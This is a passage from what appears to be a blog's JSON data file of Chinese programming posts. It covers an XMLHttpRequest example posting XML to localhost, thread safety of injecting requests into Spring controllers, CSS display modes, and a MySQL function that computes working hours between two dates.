class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class=\"line\">  var xmlData = &quot;&lt;xml&gt;&lt;ToUserName&gt;&lt;![CDATA[toUser]]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt;![CDATA[fromUser]]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;1348831860&lt;/CreateTime&gt;&lt;MsgType&gt;&lt;![CDATA[text]]&gt;&lt;/MsgType&gt;&lt;Content&gt;&lt;![CDATA[this is a test]]&gt;&lt;/Content&gt;&lt;MsgId&gt;1234567890123456&lt;/MsgId&gt;&lt;/xml&gt;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">var xmlhttp;</span><br><span class=\"line\">function loadXMLDoc(url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">xmlhttp=null;</span><br><span class=\"line\">if (window.XMLHttpRequest)</span><br><span class=\"line\">  &#123;// all modern browsers</span><br><span class=\"line\">  xmlhttp=new XMLHttpRequest();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">else if (window.ActiveXObject)</span><br><span class=\"line\">  &#123;// for IE5, IE6</span><br><span class=\"line\">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">if (xmlhttp!=null)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  xmlhttp.onreadystatechange=state_Change;</span><br><span class=\"line\">  xmlhttp.open(&quot;POST&quot;,url,true);</span><br><span class=\"line\">  xmlhttp.setRequestHeader(&quot;Accept&quot;,&quot;application/xml&quot;); </span><br><span class=\"line\">  xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/xml&quot;); </span><br><span class=\"line\">  xmlhttp.send(xmlData);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  alert(&quot;Your browser does not support XMLHTTP.&quot;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function state_Change()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">if (xmlhttp.readyState==4)</span><br><span class=\"line\">  &#123;// 4 = &quot;loaded&quot;</span><br><span class=\"line\">  if (xmlhttp.status==200)</span><br><span class=\"line\">    &#123;// 200 = &quot;OK&quot;</span><br><span class=\"line\">    document.getElementById(&apos;p1&apos;).innerHTML=&quot;This file was last modified on: &quot; + xmlhttp.getResponseHeader(&apos;Last-Modified&apos;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    alert(&quot;Problem retrieving data:&quot; + xmlhttp.statusText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;p id=&quot;p1&quot;&gt;</span><br><span class=\"line\">The getResponseHeader() function returns a header from a resource.</span><br><span class=\"line\">Headers contain file information like length,</span><br><span class=\"line\">server-type, content-type, date-modified, etc.&lt;/p&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;button onclick=&quot;loadXMLDoc(&apos;http://localhost:8080/valida/webctrl/demo/txml&apos;)&quot;&gt;Get &quot;Last-Modified&quot;&lt;/button&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>另外一种使用jackson实现xml数据交换的配置，详见另一篇博客</p>\n<p><a href=\"./2017-08-18_spring_xml_jackson.md\">spring基于xml格式数据交换的前后端配置与使用之Jackson方式</a></p>\n"},{"title":"SpringMVC 在controller层中注入request（不会产生线程安全问题）","date":"2017-07-27T11:20:10.000Z","keywords":"request, 线程安全, spring","rId":"MB-17072701","_content":"\n之前做项目的时候，在controller中多个方法需要用到request和session获取用户相关值，为了方便写了个BaseController所有controller基础它，在BaseController中Autowired注解request和httpsession，这样子，不需要在各个接口单独加上request入参。最近偶然看到一篇博客称这种方式会有县城安全问题，所以重新复核了一遍。\n\n阅读了spring的部分源码之后，发现spring是通过threadlocal方式存储的reqeust信息，而spring包下的HttpServletRequest是spring为了达到这个目的而对ServletReqeust进行的一层壳封装，通过这层封装达到对ThreadLocal中的request的调用。因此，直接将HttpServletRequest注入到成员变量上不会产生线程安全问题。\n","source":"_posts/2017-07-27_threadlocal_request.md","raw":"---\ntitle: SpringMVC 在controller层中注入request（不会产生线程安全问题）\ndate: 2017-07-27 19:20:10\ntags: spring\npermalink: spring-threadlocal\nkeywords: request, 线程安全, spring\nrId: MB-17072701\n---\n\n之前做项目的时候，在controller中多个方法需要用到request和session获取用户相关值，为了方便写了个BaseController所有controller基础它，在BaseController中Autowired注解request和httpsession，这样子，不需要在各个接口单独加上request入参。最近偶然看到一篇博客称这种方式会有县城安全问题，所以重新复核了一遍。\n\n阅读了spring的部分源码之后，发现spring是通过threadlocal方式存储的reqeust信息，而spring包下的HttpServletRequest是spring为了达到这个目的而对ServletReqeust进行的一层壳封装，通过这层封装达到对ThreadLocal中的request的调用。因此，直接将HttpServletRequest注入到成员变量上不会产生线程安全问题。\n","slug":"spring-threadlocal","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05i000dg0ukx8645vt5","content":"<p>之前做项目的时候，在controller中多个方法需要用到request和session获取用户相关值，为了方便写了个BaseController所有controller基础它，在BaseController中Autowired注解request和httpsession，这样子，不需要在各个接口单独加上request入参。最近偶然看到一篇博客称这种方式会有县城安全问题，所以重新复核了一遍。</p>\n<p>阅读了spring的部分源码之后，发现spring是通过threadlocal方式存储的reqeust信息，而spring包下的HttpServletRequest是spring为了达到这个目的而对ServletReqeust进行的一层壳封装，通过这层封装达到对ThreadLocal中的request的调用。因此，直接将HttpServletRequest注入到成员变量上不会产生线程安全问题。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>之前做项目的时候，在controller中多个方法需要用到request和session获取用户相关值，为了方便写了个BaseController所有controller基础它，在BaseController中Autowired注解request和httpsession，这样子，不需要在各个接口单独加上request入参。最近偶然看到一篇博客称这种方式会有县城安全问题，所以重新复核了一遍。</p>\n<p>阅读了spring的部分源码之后，发现spring是通过threadlocal方式存储的reqeust信息，而spring包下的HttpServletRequest是spring为了达到这个目的而对ServletReqeust进行的一层壳封装，通过这层封装达到对ThreadLocal中的request的调用。因此，直接将HttpServletRequest注入到成员变量上不会产生线程安全问题。</p>\n"},{"title":"CSS属性display的inline、block、inline-block的区别","date":"2017-09-30T14:42:01.000Z","keywords":"display, inline, block","rId":"MB-17093001","_content":"\n## 三种元素解释\n\nblock:：对象为块状元素，整体保持块状状态（矩形形状），并且单独占据一行（同一行内不会有兄弟节点）\n\ninline：对象为行内元素，整体不会一定保持块状状态，并且不会一定单独占据一行，超过一行的部分进入下一行\n\ninline-block：介于block与inline之间，整体保持块状状态，但不会一定单独占据一行\n\n## 案例解析\n\n### HTML\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n<title>test</title>\n<style>\n.dsp-demo {\n    width: 150px;\n    display: inline;\n/*    display: block; */\n/*    display: inline-block; */\n}\n</style>\n</head>\n<body>\n<div style=\"width: 400px;\">\n<span class=\"dsp-demo\" style=\"border: 1px solid #ff0;\">\n第一个-----------------------------------------------------------------------------------\n</span>\n<span class=\"dsp-demo\" style=\"border: 1px solid #0ff;\">\n第二个-----------------------------------------------------------------------------------\n</span>\n<span class=\"dsp-demo\" style=\"border: 1px solid #f0f;\">\n第三个-----------------------------------------------------------------------------------\n</span>\n</div>\n</body>\n</html>\n\n```\n\n\n\n### inline元素呈现效果\n![在这里插入图片描述](../static/MB17093001-1.png)\n\n### block元素呈现效果\n![在这里插入图片描述](../static/MB17093001-2.png)\n\n### inline-block元素呈现效果\n![在这里插入图片描述](../static/MB17093001-3.png)\n\n### 解析\n\n如上所示：inline元素的呈现中，注意第一个span的第二行与第一行宽度不相同，并且span的边界跨越了多行（无块状特性），该特性导致设置的width、height属性无效，第二个span接续第一个span继续呈现（不独占一行特性）；block元素的呈现中，span整体为矩形（块状特性），虽然父div有400px的宽度，span仅需150px，理论上一行可存在二个span，但第二个span仍然另起一行显示（独占一行特性）；inline-block元素的呈现中，span整体为矩形（块状特性），一行显示两个span（不独占一行特性）\n\n","source":"_posts/2017-09-30_css_display.md","raw":"---\ntitle: CSS属性display的inline、block、inline-block的区别\ndate: 2017-09-30 22:42:01\ntags: css\npermalink: css-display\nkeywords: display, inline, block\nrId: MB-17093001\n---\n\n## 三种元素解释\n\nblock:：对象为块状元素，整体保持块状状态（矩形形状），并且单独占据一行（同一行内不会有兄弟节点）\n\ninline：对象为行内元素，整体不会一定保持块状状态，并且不会一定单独占据一行，超过一行的部分进入下一行\n\ninline-block：介于block与inline之间，整体保持块状状态，但不会一定单独占据一行\n\n## 案例解析\n\n### HTML\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n<title>test</title>\n<style>\n.dsp-demo {\n    width: 150px;\n    display: inline;\n/*    display: block; */\n/*    display: inline-block; */\n}\n</style>\n</head>\n<body>\n<div style=\"width: 400px;\">\n<span class=\"dsp-demo\" style=\"border: 1px solid #ff0;\">\n第一个-----------------------------------------------------------------------------------\n</span>\n<span class=\"dsp-demo\" style=\"border: 1px solid #0ff;\">\n第二个-----------------------------------------------------------------------------------\n</span>\n<span class=\"dsp-demo\" style=\"border: 1px solid #f0f;\">\n第三个-----------------------------------------------------------------------------------\n</span>\n</div>\n</body>\n</html>\n\n```\n\n\n\n### inline元素呈现效果\n![在这里插入图片描述](../static/MB17093001-1.png)\n\n### block元素呈现效果\n![在这里插入图片描述](../static/MB17093001-2.png)\n\n### inline-block元素呈现效果\n![在这里插入图片描述](../static/MB17093001-3.png)\n\n### 解析\n\n如上所示：inline元素的呈现中，注意第一个span的第二行与第一行宽度不相同，并且span的边界跨越了多行（无块状特性），该特性导致设置的width、height属性无效，第二个span接续第一个span继续呈现（不独占一行特性）；block元素的呈现中，span整体为矩形（块状特性），虽然父div有400px的宽度，span仅需150px，理论上一行可存在二个span，但第二个span仍然另起一行显示（独占一行特性）；inline-block元素的呈现中，span整体为矩形（块状特性），一行显示两个span（不独占一行特性）\n\n","slug":"css-display","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05j000eg0ukrcwk8h9f","content":"<h2 id=\"三种元素解释\"><a href=\"#三种元素解释\" class=\"headerlink\" title=\"三种元素解释\"></a>三种元素解释</h2><p>block:：对象为块状元素，整体保持块状状态（矩形形状），并且单独占据一行（同一行内不会有兄弟节点）</p>\n<p>inline：对象为行内元素，整体不会一定保持块状状态，并且不会一定单独占据一行，超过一行的部分进入下一行</p>\n<p>inline-block：介于block与inline之间，整体保持块状状态，但不会一定单独占据一行</p>\n<h2 id=\"案例解析\"><a href=\"#案例解析\" class=\"headerlink\" title=\"案例解析\"></a>案例解析</h2><h3 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;test&lt;/title&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">.dsp-demo &#123;</span><br><span class=\"line\">    width: 150px;</span><br><span class=\"line\">    display: inline;</span><br><span class=\"line\">/*    display: block; */</span><br><span class=\"line\">/*    display: inline-block; */</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div style=&quot;width: 400px;&quot;&gt;</span><br><span class=\"line\">&lt;span class=&quot;dsp-demo&quot; style=&quot;border: 1px solid #ff0;&quot;&gt;</span><br><span class=\"line\">第一个-----------------------------------------------------------------------------------</span><br><span class=\"line\">&lt;/span&gt;</span><br><span class=\"line\">&lt;span class=&quot;dsp-demo&quot; style=&quot;border: 1px solid #0ff;&quot;&gt;</span><br><span class=\"line\">第二个-----------------------------------------------------------------------------------</span><br><span class=\"line\">&lt;/span&gt;</span><br><span class=\"line\">&lt;span class=&quot;dsp-demo&quot; style=&quot;border: 1px solid #f0f;&quot;&gt;</span><br><span class=\"line\">第三个-----------------------------------------------------------------------------------</span><br><span class=\"line\">&lt;/span&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"inline元素呈现效果\"><a href=\"#inline元素呈现效果\" class=\"headerlink\" title=\"inline元素呈现效果\"></a>inline元素呈现效果</h3><p><img src=\"../static/MB17093001-1.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"block元素呈现效果\"><a href=\"#block元素呈现效果\" class=\"headerlink\" title=\"block元素呈现效果\"></a>block元素呈现效果</h3><p><img src=\"../static/MB17093001-2.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"inline-block元素呈现效果\"><a href=\"#inline-block元素呈现效果\" class=\"headerlink\" title=\"inline-block元素呈现效果\"></a>inline-block元素呈现效果</h3><p><img src=\"../static/MB17093001-3.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><p>如上所示：inline元素的呈现中，注意第一个span的第二行与第一行宽度不相同，并且span的边界跨越了多行（无块状特性），该特性导致设置的width、height属性无效，第二个span接续第一个span继续呈现（不独占一行特性）；block元素的呈现中，span整体为矩形（块状特性），虽然父div有400px的宽度，span仅需150px，理论上一行可存在二个span，但第二个span仍然另起一行显示（独占一行特性）；inline-block元素的呈现中，span整体为矩形（块状特性），一行显示两个span（不独占一行特性）</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"三种元素解释\"><a href=\"#三种元素解释\" class=\"headerlink\" title=\"三种元素解释\"></a>三种元素解释</h2><p>block:：对象为块状元素，整体保持块状状态（矩形形状），并且单独占据一行（同一行内不会有兄弟节点）</p>\n<p>inline：对象为行内元素，整体不会一定保持块状状态，并且不会一定单独占据一行，超过一行的部分进入下一行</p>\n<p>inline-block：介于block与inline之间，整体保持块状状态，但不会一定单独占据一行</p>\n<h2 id=\"案例解析\"><a href=\"#案例解析\" class=\"headerlink\" title=\"案例解析\"></a>案例解析</h2><h3 id=\"HTML\"><a href=\"#HTML\" class=\"headerlink\" title=\"HTML\"></a>HTML</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;test&lt;/title&gt;</span><br><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\">.dsp-demo &#123;</span><br><span class=\"line\">    width: 150px;</span><br><span class=\"line\">    display: inline;</span><br><span class=\"line\">/*    display: block; */</span><br><span class=\"line\">/*    display: inline-block; */</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div style=&quot;width: 400px;&quot;&gt;</span><br><span class=\"line\">&lt;span class=&quot;dsp-demo&quot; style=&quot;border: 1px solid #ff0;&quot;&gt;</span><br><span class=\"line\">第一个-----------------------------------------------------------------------------------</span><br><span class=\"line\">&lt;/span&gt;</span><br><span class=\"line\">&lt;span class=&quot;dsp-demo&quot; style=&quot;border: 1px solid #0ff;&quot;&gt;</span><br><span class=\"line\">第二个-----------------------------------------------------------------------------------</span><br><span class=\"line\">&lt;/span&gt;</span><br><span class=\"line\">&lt;span class=&quot;dsp-demo&quot; style=&quot;border: 1px solid #f0f;&quot;&gt;</span><br><span class=\"line\">第三个-----------------------------------------------------------------------------------</span><br><span class=\"line\">&lt;/span&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"inline元素呈现效果\"><a href=\"#inline元素呈现效果\" class=\"headerlink\" title=\"inline元素呈现效果\"></a>inline元素呈现效果</h3><p><img src=\"../static/MB17093001-1.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"block元素呈现效果\"><a href=\"#block元素呈现效果\" class=\"headerlink\" title=\"block元素呈现效果\"></a>block元素呈现效果</h3><p><img src=\"../static/MB17093001-2.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"inline-block元素呈现效果\"><a href=\"#inline-block元素呈现效果\" class=\"headerlink\" title=\"inline-block元素呈现效果\"></a>inline-block元素呈现效果</h3><p><img src=\"../static/MB17093001-3.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><p>如上所示：inline元素的呈现中，注意第一个span的第二行与第一行宽度不相同，并且span的边界跨越了多行（无块状特性），该特性导致设置的width、height属性无效，第二个span接续第一个span继续呈现（不独占一行特性）；block元素的呈现中，span整体为矩形（块状特性），虽然父div有400px的宽度，span仅需150px，理论上一行可存在二个span，但第二个span仍然另起一行显示（独占一行特性）；inline-block元素的呈现中，span整体为矩形（块状特性），一行显示两个span（不独占一行特性）</p>\n"},{"title":"mysql计算两个日期间的工作时长（剔除周末，设定上班时间）","date":"2017-12-22T04:35:33.000Z","keywords":"工作时间, 时间范围, mysql","rId":"MB-17122201","_content":"\n##  SQL方法创建\n\n```\n# 查询时间段内的工作时间函数(剔除周末与非工作时间)\n# 参数解释\n# _st: 开始时间\n# _ed: 结束时间\n# _hour1: 工作时间开始小时\n# _hour2: 工作时间结束小时\n# _minute1: 工作时间开始分钟\n# _minute2: 工作时间结束分钟\n# 返回工作时间总分钟数\n\nDELIMITER $$\nCREATE FUNCTION work_minute_sum(_st DATETIME, _ed DATETIME, _hour1 INT, _hour2 INT, _minute1 INT, _minute2 INT) RETURNS INTEGER\nBEGIN\n    DECLARE _one_week_minute INT DEFAULT 10080;\n    DECLARE _one_day_work_minute INT DEFAULT (_hour2 - _hour1) * 60 - _minute1 + _minute2;\n    DECLARE _st_hour INT DEFAULT DATE_FORMAT(_st, '%H');\n    DECLARE _ed_hour INT DEFAULT DATE_FORMAT(_ed, '%H');\n    DECLARE _st_minute INT DEFAULT DATE_FORMAT(_st, '%i');\n    DECLARE _ed_minute INT DEFAULT DATE_FORMAT(_ed, '%i');\n    DECLARE _st_week INT DEFAULT DATE_FORMAT(_st, '%w');\n    DECLARE _ed_week INT DEFAULT DATE_FORMAT(_ed, '%w');\n    \n    DECLARE _diffminute INT;\n    DECLARE _che DATETIME;\n    DECLARE _flag INT DEFAULT 1;\n    DECLARE _week INT;\n    DECLARE _hour_div INT;\n    DECLARE _count_week INT DEFAULT 0;\n    DECLARE _work_minute INT DEFAULT 0;\n    \n    IF ((_hour1 > _hour2) || (_hour1 = _hour2 && _minute1 >= _minute2)) THEN\n        RETURN 0;\n    END IF;\n    IF _st > _ed THEN \n        SET _che = _st;\n        SET _st = _ed;\n        SET _ed = _che;\n        SET _flag = -1;\n    END IF;\n\n    SET _diffminute = TIMESTAMPDIFF(MINUTE, _st, _ed);\n    SET _count_week = _diffminute / _one_week_minute;\n    SET _work_minute = _count_week * 5 * _one_day_work_minute;\n    \n    SET _st = DATE_ADD(_st, INTERVAL (_count_week * 7) DAY);\n\n    IF (_st_week = 0 || _st_week = 6) THEN\n        SET _work_minute = _work_minute;\n    ELSEIF ((_st_hour > _hour2) || (_st_hour = _hour2 && _st_minute >= _minute2)) THEN\n        SET _work_minute = _work_minute - _one_day_work_minute;\n\tELSEIF (_st_hour > _hour1) || (_st_hour = _hour1 && _st_minute > _minute1) THEN\n        SET _hour_div = _st_hour - _hour1;\n        SET _work_minute = _work_minute - (_hour_div * 60) - _st_minute + _minute1;\n    END IF;\n    \n    IF _ed_week = 0 || _ed_week = 6 || _ed_hour < _st_hour || (_ed_hour = _st_hour && _ed_minute <= _st_minute) THEN\n        SET _work_minute = _work_minute;\n    ELSEIF (_ed_hour < _hour1) || (_ed_hour = _hour1 && _ed_minute < _minute1) THEN\n        SET _work_minute = _work_minute - _one_day_work_minute;\n    ELSEIF (_ed_hour < _hour2) || (_ed_hour = _hour2 && _ed_minute < _minute2) THEN\n\t\tSET _hour_div = _hour2 - _ed_hour;\n        SET _work_minute = _work_minute - (_hour_div * 60) + _ed_minute - _minute2;\n    END IF;\n    \n    loop_cal:LOOP\n        SET _week = DATE_FORMAT(_st, '%w');\n        IF _st >= _ed THEN\n            LEAVE loop_cal;\n        END IF;\n        IF _week != 0 && _week != 6 THEN\n\t\t    SET _work_minute = _work_minute + _one_day_work_minute;\n        END IF;\n        SET _st = DATE_ADD(_st, INTERVAL 1 DAY);\n    END LOOP;\n    \n    RETURN _work_minute * _flag;\nEND $$\nDELIMITER ;\n```\n\n## 调用方法\n#例：某公司工作时间为上午： 09:00 ~ 12:00，下午： 13:30 ~ 18:00，则在2019年3月3日0点到2019年3月13日22点的总工作时间是：\nselect work_minute_sum('2019-03-03 00:00:00', '2019-03-13 22:00:00', 9, 12, 0, 0) + work_minute_sum('2019-03-03 00:00:00', '2019-03-13 22:00:00', 13, 18, 30, 0);\n","source":"_posts/2017-12-22_mysql_worktime.md","raw":"---\ntitle: mysql计算两个日期间的工作时长（剔除周末，设定上班时间）\ndate: 2017-12-22 12:35:33\ntags: mysql\npermalink: mysql-worktime\nkeywords: 工作时间, 时间范围, mysql\nrId: MB-17122201\n---\n\n##  SQL方法创建\n\n```\n# 查询时间段内的工作时间函数(剔除周末与非工作时间)\n# 参数解释\n# _st: 开始时间\n# _ed: 结束时间\n# _hour1: 工作时间开始小时\n# _hour2: 工作时间结束小时\n# _minute1: 工作时间开始分钟\n# _minute2: 工作时间结束分钟\n# 返回工作时间总分钟数\n\nDELIMITER $$\nCREATE FUNCTION work_minute_sum(_st DATETIME, _ed DATETIME, _hour1 INT, _hour2 INT, _minute1 INT, _minute2 INT) RETURNS INTEGER\nBEGIN\n    DECLARE _one_week_minute INT DEFAULT 10080;\n    DECLARE _one_day_work_minute INT DEFAULT (_hour2 - _hour1) * 60 - _minute1 + _minute2;\n    DECLARE _st_hour INT DEFAULT DATE_FORMAT(_st, '%H');\n    DECLARE _ed_hour INT DEFAULT DATE_FORMAT(_ed, '%H');\n    DECLARE _st_minute INT DEFAULT DATE_FORMAT(_st, '%i');\n    DECLARE _ed_minute INT DEFAULT DATE_FORMAT(_ed, '%i');\n    DECLARE _st_week INT DEFAULT DATE_FORMAT(_st, '%w');\n    DECLARE _ed_week INT DEFAULT DATE_FORMAT(_ed, '%w');\n    \n    DECLARE _diffminute INT;\n    DECLARE _che DATETIME;\n    DECLARE _flag INT DEFAULT 1;\n    DECLARE _week INT;\n    DECLARE _hour_div INT;\n    DECLARE _count_week INT DEFAULT 0;\n    DECLARE _work_minute INT DEFAULT 0;\n    \n    IF ((_hour1 > _hour2) || (_hour1 = _hour2 && _minute1 >= _minute2)) THEN\n        RETURN 0;\n    END IF;\n    IF _st > _ed THEN \n        SET _che = _st;\n        SET _st = _ed;\n        SET _ed = _che;\n        SET _flag = -1;\n    END IF;\n\n    SET _diffminute = TIMESTAMPDIFF(MINUTE, _st, _ed);\n    SET _count_week = _diffminute / _one_week_minute;\n    SET _work_minute = _count_week * 5 * _one_day_work_minute;\n    \n    SET _st = DATE_ADD(_st, INTERVAL (_count_week * 7) DAY);\n\n    IF (_st_week = 0 || _st_week = 6) THEN\n        SET _work_minute = _work_minute;\n    ELSEIF ((_st_hour > _hour2) || (_st_hour = _hour2 && _st_minute >= _minute2)) THEN\n        SET _work_minute = _work_minute - _one_day_work_minute;\n\tELSEIF (_st_hour > _hour1) || (_st_hour = _hour1 && _st_minute > _minute1) THEN\n        SET _hour_div = _st_hour - _hour1;\n        SET _work_minute = _work_minute - (_hour_div * 60) - _st_minute + _minute1;\n    END IF;\n    \n    IF _ed_week = 0 || _ed_week = 6 || _ed_hour < _st_hour || (_ed_hour = _st_hour && _ed_minute <= _st_minute) THEN\n        SET _work_minute = _work_minute;\n    ELSEIF (_ed_hour < _hour1) || (_ed_hour = _hour1 && _ed_minute < _minute1) THEN\n        SET _work_minute = _work_minute - _one_day_work_minute;\n    ELSEIF (_ed_hour < _hour2) || (_ed_hour = _hour2 && _ed_minute < _minute2) THEN\n\t\tSET _hour_div = _hour2 - _ed_hour;\n        SET _work_minute = _work_minute - (_hour_div * 60) + _ed_minute - _minute2;\n    END IF;\n    \n    loop_cal:LOOP\n        SET _week = DATE_FORMAT(_st, '%w');\n        IF _st >= _ed THEN\n            LEAVE loop_cal;\n        END IF;\n        IF _week != 0 && _week != 6 THEN\n\t\t    SET _work_minute = _work_minute + _one_day_work_minute;\n        END IF;\n        SET _st = DATE_ADD(_st, INTERVAL 1 DAY);\n    END LOOP;\n    \n    RETURN _work_minute * _flag;\nEND $$\nDELIMITER ;\n```\n\n## 调用方法\n#例：某公司工作时间为上午： 09:00 ~ 12:00，下午： 13:30 ~ 18:00，则在2019年3月3日0点到2019年3月13日22点的总工作时间是：\nselect work_minute_sum('2019-03-03 00:00:00', '2019-03-13 22:00:00', 9, 12, 0, 0) + work_minute_sum('2019-03-03 00:00:00', '2019-03-13 22:00:00', 13, 18, 30, 0);\n","slug":"mysql-worktime","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05l000fg0ukamextg8y","content":"<h2 id=\"SQL方法创建\"><a href=\"#SQL方法创建\" class=\"headerlink\" title=\"SQL方法创建\"></a>SQL方法创建</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span 